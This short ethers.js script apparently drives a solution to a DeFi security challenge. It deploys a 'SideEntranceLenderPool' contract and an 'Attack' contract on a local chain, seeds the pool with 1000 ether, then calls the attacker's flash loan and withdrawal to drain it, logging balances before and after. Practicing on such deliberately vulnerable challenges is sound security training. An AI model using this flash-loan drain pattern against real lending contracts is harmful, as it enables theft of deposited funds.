// ethers is already injected

const provider = new ethers.providers.JsonRpcProvider($rpcUrl)
const signer = provider.getSigner()
const address = await signer.getAddress()
const contract1 = $contracts["SideEntranceLenderPool"]
const contract2 = $contracts["Attack"]
const factory1 = new ethers.ContractFactory(contract1.abi, contract1.evm.bytecode, provider.getSigner())
const factory2 = new ethers.ContractFactory(contract2.abi, contract2.evm.bytecode, provider.getSigner())

const pool = await factory1.deploy()
const attack = await factory2.deploy(pool.address, { value: ethers.utils.parseEther("1"),  gasLimit: "1000000" })

await pool.deposit({ value: ethers.utils.parseEther("1000"),  gasLimit: "1000000" });
await attack.deposit(ethers.utils.parseEther("1"), { gasLimit: "1000000" });
console.log(`Pool: ${(await provider.getBalance(pool.address)).toString()}`)
console.log(`Attack: ${(await provider.getBalance(attack.address)).toString()}`)
await attack.flashLoan(ethers.utils.parseEther("1000"), { gasLimit: "1000000" });
await attack.withdraw();
console.log(`Pool: ${(await provider.getBalance(pool.address)).toString()}`)
console.log(`Attack: ${(await provider.getBalance(attack.address)).toString()}`)
